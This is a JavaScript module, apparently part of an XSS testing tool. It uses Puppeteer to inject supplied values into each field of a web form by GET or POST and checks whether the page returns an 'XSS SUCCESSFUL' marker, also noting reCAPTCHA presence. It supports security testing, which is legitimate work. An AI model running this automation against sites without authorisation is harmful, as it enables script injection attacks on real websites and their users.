const puppeteer = require('puppeteer');
const p = require('./params')

// xss attack
async function xssAttack(params, inputValue, index){
    if (params.form.method === "get"){
        // method get attack
        var inputNameAll = "";
        for(var i=0; i<params.input.length; i++){
            // attack with every script
            var browser = await puppeteer.launch();//{headless: false}
            var att = params.input[i].name + "=" + urlEncode(inputValue);
            var data = await get(params.form.action, att, browser).catch(async (err) =>{
                // error with single input 
                // check with all the inputs 
                var nameAll = composeInputNameAll(params, inputValue);
                await xssGetAllAttack(params, nameAll, browser, index);
            });

            inputNameAll = endFor(params, data, i, index, inputNameAll, att, browser);
            await browser.close();  
        }
        var browser = await puppeteer.launch();//{headless: false}
        await xssGetAllAttack(params, inputNameAll, browser, index);
    }else if (params.form.method === "post"){
        // method post attack
        var inputNameAll = "";
        for(var i=0; i<params.input.length; i++){
            // attack with every script
            var browser = await puppeteer.launch();//{headless: false}
            var att = params.input[i].name + "=" + urlEncode(inputValue);
            var data = await post(params.form.action, att, browser).catch(async (err) =>{
                // error with single input 
                // check with all the inputs
                var nameAll = composeInputNameAll(params, inputValue);
                await xssPostAllAttack(params, nameAll, browser, index);
            });

            inputNameAll = endFor(params, data, i, index, inputNameAll, att, browser);
            await browser.close();  
        }
        var browser = await puppeteer.launch();//{headless: false}
        await xssPostAllAttack(params, inputNameAll, browser, index);
    }
}

// end of for cycle
function endFor(params, data, i, index, inputNameAll, att){
    p.setReRe(params, data);
    params.input[i].test[index] = data.test;
    //build text for all inputs tested
    return addInputNameAll(inputNameAll, att, i);
}

// perform attack get with all scripts together
async function xssGetAllAttack(params, nameAll, browser, index){
    var d = await get(params.form.action, nameAll, browser).catch((err) =>{
        // error with all the inputs
        return {
            reached: true,
            recaptcha: false,
            test: false
        };
    });
    await browser.close();  
    p.setReRe(params, d);
    params.testAll[index] = d.test;
    
}

// perform attack post with all scripts together
async function xssPostAllAttack(params, nameAll, browser, index){
    var d = await post(params.form.action, nameAll, browser).catch((err) =>{
        // error with all the inputs
        return {
            reached: true,
            recaptcha: false,
            test: false
        };
    });
    await browser.close();  
    p.setReRe(params, d);
    params.testAll[index] = d.test;
}

// perform the attack
async function attack(page, url){
    process.stdout.write("Attack: STARTED: |");
    await page.goto(url, {waitUntil: 'networkidle2', timeout: 5000});
    var data = await attackSuccessful(page);
    return data;
}

// attack with get method
async function get(action, att, browser){
    var page = await browser.newPage();
    var url = action + "?" + att;
    console.log("\nWEBSITE: " + action);
    return await attack(page, url);
}

// attack with post method
async function post(action, att, browser){
    var page = await browser.newPage();
    await page.setRequestInterception(true);

    page.on('request', (request) =>{
        // set method POST
        var overrides = {
            'url': action,
            'method': 'POST',
            'postData': att,
            'headers': {
                ...request.headers(),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        }
        request.continue(overrides);
    });
    console.log("\nWEBSITE: " + action);
    return await attack(page, action); 
}

// check if the attack went successful or not
async function attackSuccessful(page){
    var data = await page.evaluate(() =>{
        // get the data

        function containsRecaptcha(text){
            // check if the webpage contains google recaptcha
            return text.includes('https://www.google.com/recaptcha/api.js');
        }

        function scriptWork(text){
            // check if the script works
            if(text === "<p>XSS SUCCESSFUL</p>"){
                return {
                    reached: true,
                    recaptcha: false,
                    test: true
                };
            }
            return {
                reached: true,
                recaptcha: false,
                test: false
            };
        }   

        if(containsRecaptcha(document.body.innerHTML)) {
            return {
                reached: true,
                recaptcha: true,
                test: false
            };
        }
        return scriptWork(document.body.innerHTML.trim());     
    });
    process.stdout.write("----------|FINISHED\n");
    return data;
}

// compose the all script string from single script string
function composeInputNameAll(params, inputValue){
    var nameAll = "";
    for(var j=0; j<params.input.length; j++){
        var s = params.input[j].name + "=" + urlEncode(inputValue);
        nameAll = addInputNameAll(nameAll, s, j)
    }
    return nameAll;
}

// add single script to all script string 
function addInputNameAll(inputNameAll, script, i){
    if(i==0){
        return inputNameAll + script; 
    }else{
        return inputNameAll + "&" + script; 
    }  
}

// make url encode
function urlEncode(text){
    var x = "";
    for(var i=0; i<text.length; i++){
        switch(text[i]) {
            case " ":
                x = x + "%20";
                break;
            case "!":
                x = x + "%21";
                break;
            case "\"":
                x = x + "%22";
                break;
            case "%":
                x = x + "%25";
                break;
            case "&":
                x = x + "%26";
              break;
            case "'":
                x = x + "%27";
                break;
            case "(":
                x = x + "%28";
                break;
            case ")":
                x = x + "%29";
                break;
            case "/":
                x = x + "%2F";
                break;
            case ";":
                x = x + "%3B";
                break;
            case "=":
                x = x + "%3D";
                break;
            case "\\":
                x = x + "%5C";
                break;
            case "{":
                x = x + "%7B";
                break;
            case "}":
                x = x + "%7D";
                break;
            default:
                x = x + text[i];
        }
    }
    return x;
}

module.exports = { xssAttack };
